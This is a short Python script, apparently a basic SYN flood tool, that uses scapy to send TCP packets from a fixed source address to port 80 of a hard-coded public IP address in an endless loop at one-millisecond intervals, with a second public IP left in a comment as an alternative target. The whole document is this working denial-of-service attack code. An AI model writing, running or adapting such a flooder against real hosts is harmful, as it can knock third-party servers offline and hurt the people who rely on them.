from scapy.all import *

source_IP = "192.168.1.110"
target_IP = "200.16.134.134"#"186.129.250.57"
source_port = RandShort()
i = 1

while True:
    IP1 = IP(src=source_IP, dst=target_IP)
    TCP1 = TCP(sport = source_port, dport = 80)
    pkt = IP1 / TCP1
    send(pkt, inter = .001)
   
    print ("packet sent ", i)
    i = i + 1